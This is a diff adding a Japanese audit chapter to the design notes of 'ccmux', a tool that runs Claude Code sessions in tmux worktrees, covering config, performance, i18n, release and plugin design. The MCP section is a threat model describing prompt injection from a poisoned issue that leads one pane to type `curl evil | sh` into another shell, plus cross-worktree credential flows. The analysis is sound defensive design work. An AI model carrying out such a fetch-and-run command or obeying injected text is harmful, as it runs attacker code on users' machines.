@@ -977,6 +977,185 @@ Claudeが迷走しはじめたら:
 
 ---
 
+## 12. 第6回 exa深堀調査（2026-05-19）— Anthropic 公式最新ガイドと実装ディテール
+
+> 第4回・第5回と被らない直交10テーマで100クエリ。今回は「Anthropic 公式 2026 最新ガイド」と
+> 「実装時に踏みがちな細部 (locale/perf/concurrency など)」に踏み込む。
+
+### 12.1 CLAUDE.md / Skill content discipline (`commands/reflect.ts`)
+
+**根本原因**
+1. **Reflexion 自動 append が dedup/contradiction-check/pruning なし** — Anthropic 公式の ~200行 ceiling を数週で突破、ContraDoc/NLI で見れば矛盾だらけ。"lost in the middle" position bias で中間ルールが無視される。
+2. **CLAUDE.md sentinel install が CVE-2026-21852 系の特権コード経路** — Feb 2026 の hackerbot-claw キャンペーンで Microsoft/DataDog/Aqua repo の CLAUDE.md が改ざんされた既報。`reflect.ts` の append にも provenance tagging/signed-commit gating が必要。
+3. **CLAUDE.md ↔ SKILL.md ↔ `.claude/rules/` の promotion/demotion パイプライン不在** — `user-invocable: false` の skill 化と `paths:` frontmatter scoped rule の 2 つで 503行削減した case study 既知 (zenn.dev/yottayoshida)、ccmux は全部 always-loaded layer に積み上げ。
+
+**ベストプラクティス対応**
+- pre-commit hook で 180 行 cap、超過時に SKILL.md demote プロンプトを強制
+- `bart-large-mnli` で pairwise NLI contradiction 検出 → human triage gate
+- ルールに UUID 付与、下流 tool call が intent match した時に fire log、zero-fire ルールを月次で削除候補化
+- `DecayingSortedField` + `last_fired` exponential decay (`score × exp(-0.01 × days)`)、60d soft / 120d hard 削除
+- "DO NOT" 否定形を "instead of X, do Y" 形に lint、hard constraints を primacy + recency で先頭末尾に。`@AGENTS.md` import で ccmux 自体は ~30行 overlay に
+
+### 12.2 MCP (Model Context Protocol) サーバ設計 & 攻撃面
+
+**根本原因（仮に ccmux が MCP server 化した場合）**
+1. **クロス worktree toxic flow** — N worktree それぞれが credentials/tokens を抱えるので、`read_worktree_file` で攻撃文字列を読み → `write_worktree_file` で別 worktree に書く GitHub MCP 既知パターンの blast radius が ccmux で倍増。
+2. **stdio default = 認証なし = host 全権限** — `~/.config/Claude/claude_desktop_config.json` を覗いた悪意ある VS Code 拡張が tmux send-keys → 任意コード実行。
+3. **`tmux send-keys` を tool 化するとプロンプト injection → コマンド injection 直結** — poisoned issue を読んだ pane が別 pane の shell に `curl evil | sh` を打ち込める。
+
+**ベストプラクティス対応**
+- 仕様: 2026-03-15 spec の RFC 8707 Resource Indicators + RFC 9728 PRM + OAuth 2.1 with PKCE + CIMD 必須
+- transport: stdio (local) or Streamable HTTP (`/mcp` + `MCP-Session-Id`) のみ。HTTP+SSE は deprecated
+- session を first worktree に pin (Cedar-style policy)、cross-worktree tool args を reject
+- `ccmux mcp serve` を `@anthropic-ai/sandbox-runtime` (bwrap + apply-seccomp) 経由で再 exec
+- Zeph 流 `trust_level` (trusted/untrusted/sandboxed) + `tool_allowlist`、`send_keys`/`write_file`/`merge`/`autoclaw_dispatch` に `require_approval: always`
+- registry.modelcontextprotocol.io に GitHub OIDC で publish、Sigstore attestation + hash pin で `tools/list_changed` rug-pull を防御
+- **結論**: ccmux は MCP server 化「すべき。ただし stdio-only / single-worktree-pinned / read-mostly」。remote ゲートウェイ化は Kitchen-Sink antipattern
+
+### 12.3 性能 / startup / TS build pipeline
+
+**根本原因**
+1. **全 command 静的 import** — `tsc`-built ESM が commander entry で全 action handler の依存ツリー（better-sqlite3 native binding 含む）を `--help` でも load。openclaw の同等修正で 5.9s → 0.12s (49x) の実測既存。
+2. **better-sqlite3 native dlopen が cold path に常時** — Node ≥22.5 の built-in `node:sqlite` が使えるのに dlopen 毎回。Node 24 で `.got.plt` collision SIGSEGV のリスク。
+3. **bundle 無し + ESM `import` hoisting の Node 22 ペナルティ** — AWS SDK v3 が Node 22 で 50ms regression を `import` hoisting に帰着 (#6914 + #45659)。`tsc` 一ファイル一出力なので N file stat + N module resolve。
+
+**ベストプラクティス対応**
+- `program.command(...).action(handler)` を `delayedRequire` でラップ、`await import('./commands/foo.js')` を action 内に
+- **`tsdown` (Rolldown) か esbuild** で bundle、`"sideEffects": false` + `"type": "module"` で tree-shake
+- `hasModernSqlite()` gate: Node ≥22.5 は `node:sqlite`、それ未満は dynamic import の better-sqlite3
+- `chalk`→`picocolors` (0.466ms vs 6.167ms, 14x 小), `ora`→`nanospinner` (14x 小、picocolors 単一依存)
+- 計測ベースライン: `node --cpu-prof bin/ccmux --help` + `hyperfine 'node bin/ccmux --help'`
+- ROI 順: lazy command imports → lazy better-sqlite3 → tsdown bundle → picocolors/nanospinner → SEA snapshot
+
+### 12.4 ドキュメント生成 & drift 防止
+
+**根本原因**
+1. **single source of truth 不在** — command 宣言が src + README + completions/_ccmux + ccmux.bash + LAB-WIKI に手書き重複。1コマンド追加 = 4編集 → 必ず drift（前回監査で実証済）。
+2. **CI drift gate 不在** — `ccmux --help` snapshot test があれば README から 7 command 欠落は即検出できた。
+3. **completion 手書き、`completion` subcommand 非装備** — oclif/Cobra は runtime metadata から完了補完を吐くので構造的に drift しない。
+
+**ベストプラクティス対応**
+- `<!-- commands -->` marker + `scripts/gen-readme.ts` で commander の `program.commands` walk → README 自動上書き、pre-commit と CI 両方でガード
+- `help2man` or `commander-to-markdown` で man page、npm `man` field に登録
+- clig.dev / BetterCLI 流儀: flag short desc は小文字+ピリオド無し、`--help` は exit 0 stdout、EXAMPLES block 必須
+- config を Zod 定義 → `z.toJSONSchema()` で公開、editor 補完用 `$schema` URL
+- Runme / runzmd で fenced shell block を runnable に、CI で smoke 実行 → docs rot 防止
+- 最小一発: `scripts/sync-docs.ts` (~50行) で README/completions/help snapshot を一発同期、pre-commit + `pnpm test` で wire
+
+### 12.5 Configuration 管理 (`config/schema.ts`)
+
+**根本原因**
+1. **shallow merge `{...DEFAULTS, ...parsed}`** (schema.ts:91) — 一階層 spread。`n8n:{enabled:true}` ユーザ書き込みでデフォルトの `webhookUrl`/`servePort` が全消し。validation 無しで unknown key/wrong type 全通過。
+2. **`version: 1` フィールドが宣言済も migration code が読まない** — リネーム/移動が将来即破壊、rollback 経路ゼロ。
+3. **secrets 平文同居** — `obsidian.apiKey`, `n8n.{authToken,webhookSecret}`, `autoclaw.authToken` を `~/.ccmux/config.json` に直書き、`${ENV_VAR}` interpolation も `ref://` indirection も無し。
+
+**ベストプラクティス対応**
+- **Zod v4** 採用 (`z.toJSONSchema()` 標準装備、`z.prettifyError()` で actionable エラー)、`ConfigSchema.parse(deepMerge(DEFAULTS, parsed))`
+- convict 流の precedence `defaults < file < env < CLI flag`、各フィールドに `env: "CCMUX_N8N_PORT"` マッピング
+- **cosmiconfig** `searchStrategy: 'global'` で `$XDG_CONFIG_HOME/ccmux/config.{json,yaml,js}` + project-local `.ccmuxrc`
+- **chokidar** で hot reload (`awaitWriteFinish: {stabilityThreshold:200}` + 300ms debounce)、validation 失敗時は last-known-good 保持
+- Zod → JSON Schema 公開、初期化時に `"$schema"` 注入、`ccmux config doctor --fix` (unknown key / deprecated / unresolved `${ENV}` / version drift 検出) + `ccmux config resolve` (effective config と field source 表示)
+
+### 12.6 i18n / locale (`core/cost.ts`, `integrations/obsidian.ts`)
+
+**根本原因**
+1. **UTC ベースの「今日」計算が日本ユーザ (UTC+9) で 09:00 から壊れる** — `cost.ts:60` の `new Date().toISOString().slice(0, 10)`。ccusage は同じバグを #778 で `--timezone` フラグ / `CCUSAGE_TIMEZONE` env で解決済。
+2. **path に Unicode normalization なし** — macOS APFS は NFD-MP、Linux/NTFS は IME 入力の NFC。`がっこう` を iCloud/rsync 往復で別バイト列化、`obsidian.ts` の path 比較が silent miss。
+3. **WSL2 `/mnt/c` の case-insensitivity 仮定が成立しない** — WSL1 rsync で作った dir は per-dir case-sensitive flag を保持、`/mnt/c/work/<japanese>` が shell 間で resolve したり 404 になる。
+
+**ベストプラクティス対応**
+- `CCMUX_TIMEZONE` env、デフォルト `Intl.DateTimeFormat().resolvedOptions().timeZone`、`Intl.DateTimeFormat('en-CA', {timeZone,year,month,day})` で TZ-正確な `YYYY-MM-DD`
+- column-aligned UI は `string-width` (CJK width 正確に計算)
+- 通貨は `new Intl.NumberFormat('ja-JP',{style:'currency',currency:'JPY'})` / `'en-US'` USD（JPY は小数点なし規約）
+- CLAUDE.md / TASK_STATE.md 読み込み時に leading `﻿` strip、書き込み時 BOM 無し
+- session list sort は `Intl.Collator(locale, {numeric:true, sensitivity:'base'}).compare`（自然順 `session-2 < session-10` も無料で）
+- 比較用にだけ `string.normalize('NFC')`、保存名は触らない。git は `core.precomposeUnicode true`
+
+### 12.7 Build & release engineering
+
+**根本原因**
+1. **artifact 未公開、version 契約なし** — git-clone + `npm install` + manual alias。npm tarball 無し、integrity hash 無し、dist-tag 無し、`0.1.0` を install できない。SLSA provenance も到達不能。
+2. **better-sqlite3 native compile-on-install lottery** — `node-gyp rebuild` 毎回、Python + C++ toolchain + NODE_MODULE_VERSION マッチング必要、arm64 macOS/linux + linuxmusl prebuild は上流自体が苦闘。
+3. **versioning protocol → changelog → upgrade story が無い** — Conventional Commits 強制無し、tag-driven release 無し、CHANGELOG 無し、pin/skip 経路無し。
+
+**ベストプラクティス対応**
+- **release-please** 採用 (commit-driven, PR-gated, single-package 向き) + **commitlint** PR-title check で agent commit を `type(scope): subject` に強制
+- CHANGELOG.md は release-please 自動生成、過去分は `conventional-changelog -p angular -r 0` で backfill
+- `.github/workflows/publish.yml` を `v*` tag trigger + `permissions: id-token: write` + Trusted Publishing → provenance 自動（NPM_TOKEN 不要）。prerelease は `--tag next` で `latest` 安定
+- better-sqlite3 は **prebuildify + node-gyp-build** で `.node` を npm tarball 内に同梱、postinstall download 撤廃
+- Node SEA (`--build-sea` Node ≥25.5.0) で単一バイナリ + Homebrew tap (`homebrew-ccmux`) + Scoop/Chocolatey、`curl|sh` installer は bincast/cargo-dist パターン
+- 最小一発: `publish.yml` + Trusted Publishing + release-please で「real semver tag + auto CHANGELOG + dist-tags + SLSA provenance」が即解放
+
+### 12.8 メモリ / リソースリーク
+
+**根本原因**
+1. **無境界 `setInterval`/`setTimeout` が Ralph loop と HTTP daemon に** — `clearInterval`/`AbortSignal` cleanup を SIGINT/SIGTERM で打たないので、捕捉した request/session/worktree object が process 寿命まで pin される。
+2. **EventEmitter listener 蓄積** — per-request `.on()` で `.off()` しない、Node 警告閾値 11 を `setMaxListeners(0)` で塞ぐと真の leak が黙る。`AbortSignal` 自体に historical leak (#48951) + `defaultMaxListeners` 不適用。
+3. **better-sqlite3 connection 明示 close なし** — GC 任せで `.db-shm`/`.db-wal` ファイルと native handle が残る。per-session 接続だと `process.memoryUsage().external` が無境界成長。
+
+**ベストプラクティス対応**
+- `--max-old-space-size-percentage=50` + `--heapsnapshot-near-heap-limit=3` で OOM 直前に diffable snapshot 自動取得、30s ごとに `heapUsed` 監視
+- outbound HTTP に `agentkeepalive` (`maxSockets:100, maxFreeSockets:10, freeSocketTimeout:30000, socketActiveTTL`)
+- CI に **memlab** `find-leaks --baseline --target --final --trace-object-size-above 1000000`
+- ESM dynamic `import()` plugin は singleton registry に cache、再 import 禁止（pre-Node 20.6 で leak by design）
+- in-memory cache は `lru-cache` (max + TTL) or `WeakRef`+`FinalizationRegistry`、後者は periodic sweep と併用
+- DB は per-thread singleton + `process.on('SIGINT/SIGTERM/exit', ()=>db.close())`
+
+### 12.9 並行性プリミティブ / async patterns
+
+**根本原因**
+1. **`Promise.all` の fail-fast を parallel session spawn に使う** — 1 reject が sibling を黙って捨て、AbortController 配線なしで残り session が socket/PTY を専有し続ける。
+2. **trace-ID context を async 境界で伝播してない** — `AsyncLocalStorage` 不在で "Context-Passing Hell"、ログが session 間で繋がらず concurrent debug 不能。
+3. **`unhandledRejection`/`uncaughtException` policy 無し** — Node 15+ の `--unhandled-rejections=throw` 既定で hook 1個の浮き Promise が ccmux プロセス全死 = 全 session 道連れ。
+
+**ベストプラクティス対応**
+- session fan-out は `Promise.allSettled`、`Promise.all` は all-or-nothing config load 専用、`Promise.any` で redundant endpoint fallback、`Promise.race` は timeout boxing 専用
+- entry を `als.run({sessionId, traceId}, fn)` で wrap、logger は `als.getStore()` から ID 取得（Node 22+ は `AsyncContextFrame` で高速）
+- 並列 HTTP は `pMap(items, fn, {concurrency:8, signal})`、token-bucket は `p-throttle`、priority/pause が要るときだけ `p-queue`
+- streaming agent output を `for await...of` (`iterator.return()` 自動)、`addAbortSignal(controller.signal, stream)` で Ctrl-C 時に `AbortError` 投げて socket clean
+- Node 22 で `highWaterMark` 16→64KiB に変わったので objectMode で 64 objects 蓄積に注意、`stream/promises.pipeline()` で backpressure/error/abort 全部
+- TLA は entry のみ、循環 `await import()` は bundle で deadlock (Node 22 exit code 13, mastra#14860)。`AbortSignal` を cancellation 標準に固定
+
+### 12.10 プラグイン / 拡張性アーキテクチャ
+
+**根本原因**
+1. **plugin loader/contract 不在** — Commander が `src/index.ts` で直 import、integrations は具象 TS file。oclif スタイル plugin discovery (`plugins: ["@ccmux/plugin-*"]`) も Prettier 流 auto-load も無し。extension に「名前」が付けられない以上 semver/marketplace 議論は時期尚早。
+2. **lifecycle が private で hook bus 化されてない** — `src/core/hooks.ts` は内部 helper。Tapable 流の `SyncHook`/`AsyncSeriesHook`/`AsyncSeriesWaterfallHook`/`AsyncSeriesBailHook` + `stage`/`before`/`after` の最小公開面が無い。
+3. **integration が direct dependency で inversion されてない** — `n8n/obsidian/autoclaw` は `Backend`/`SessionStore`/`Notifier` interface 実装ではなく具象。LLM backend と session storage は VS Code `contributes` 流の swap point が必要な代表例。
+
+**ベストプラクティス対応**
+- `package.json` の `ccmux` field に `contributes` (commands/hooks/backends/stores/notifiers) + `engines.ccmux` 範囲を宣言、`oclif.manifest.json` 流 cache で起動 <100ms
+- Deno 流 allow/deny capability を manifest (`permissions.read`, `permissions.net:["api.anthropic.com"]`) で宣言、`isolated-vm` まで行かず worker_threads + per-package permission で
+- `@ccmux/plugin-api` を独立 semver package として publish、hook 改廃は MAJOR、`peerDependencies` で drift 警告
+- hook 設計を Tapable matrix から意識的に選ぶ: backend selection は `AsyncSeriesBailHook` (first match wins)、prompt/transcript transform は `AsyncSeriesWaterfallHook`、notifier は `AsyncParallelHook`、UI イベントは `SyncHook`
+- 発見 UX: npm prefix auto-load (`@ccmux/plugin-*` / `ccmux-plugin-*`) + `~/.ccmux/plugins/` + `ccmux plugins {add,remove,list,search}`。WASM/Extism (Zellij 流) は polyglot/untrusted まで保留
+
+### 横断テーマ — 第6回で見えた地雷
+
+| カテゴリ | 共通パターン |
+|---|---|
+| **runtime validation 不在** | config / CLAUDE.md / Reflexion 出力 / plugin manifest、全部 schema validation 無しで信頼している。Zod を単一基盤に |
+| **single source of truth 不在** | command 宣言、config field、tool 一覧、hook 名、全部複数箇所に手書きコピー → 必ず drift。code-as-source / generate-everything-else に統一 |
+| **静的 import の overhead** | startup / memory / plugin loading が全部 eager。lazy import / WeakRef / SEA snapshot で構造的に解決 |
+| **timezone & Unicode の盲点** | 日本ユーザ前提の Lab なのに UTC/ASCII 仮定が混入。Intl.* / NFC normalize / `string-width` で defaultable |
+| **distribution 経路 1 本** | git-clone のみ。npm publish + Homebrew + SEA binary で再現性/integrity/install UX 三立 |
+| **plugin/MCP は「持つかどうか」が真の問い** | 持つ場合 stdio-only & sandboxed & manifest-driven、持たない場合は integration を `Backend` interface に逆転だけしておく |
+
+### 第6回 next actions（優先順、第4回・第5回と独立）
+
+1. **P0**: `cost.ts:60` の UTC `toISOString().slice(0,10)` を `CCMUX_TIMEZONE` 対応に（日本ユーザの「今日」が壊れている）
+2. **P0**: `config/schema.ts:91` の shallow merge を deep merge + Zod validation に置き換え（n8n 設定書き込みでデフォルトが全消えする）
+3. **P1**: commander の eager import を lazy import 化 (`delayedRequire`)、better-sqlite3 を queue command のみで gate（startup 5.9s → 0.12s 級の効果）
+4. **P1**: `scripts/sync-docs.ts` で README/completions/help snapshot を一発同期、pre-commit + CI で drift block
+5. **P2**: release-please + Trusted Publishing 導入で `0.1.x` semver/CHANGELOG/SLSA provenance 一発解放
+6. **P2**: Reflexion 出力を CLAUDE.md ではなく `.claude/skills/reflections/SKILL.md` に分離、180 行 cap + UUID + decay
+7. **P3**: integration を `Backend`/`SessionStore`/`Notifier` interface に inversion、plugin loader は後追い
+8. **P3**: MCP server 化するなら stdio-only + single-worktree-pinned + sandbox-runtime 必須
+
+詳細出典 URL は本 commit の audit 記録参照。
+
+---
+
 ## 更新ログ
 
 | 日付 | 内容 |
@@ -984,6 +1163,7 @@ Claudeが迷走しはじめたら:
 | 2026-05-13 | 初版作成（3回のexa調査統合） |
 | 2026-05-19 | 第10章追加：第4回 exa深堀調査（10テーマ×10クエリ、根本原因+ベストプラクティス監査） |
 | 2026-05-19 | 第11章追加：第5回 exa深堀調査（直交10テーマ×10クエリ、hooks/orchestration/observability/resilience/UX/test/supply-chain/cross-platform/commit-safety/DR） |
+| 2026-05-19 | 第12章追加：第6回 exa深堀調査（直交10テーマ×10クエリ、CLAUDE.md discipline / MCP / perf / docs-gen / config / i18n / release / leaks / concurrency / plugin） |
 
 ---
 
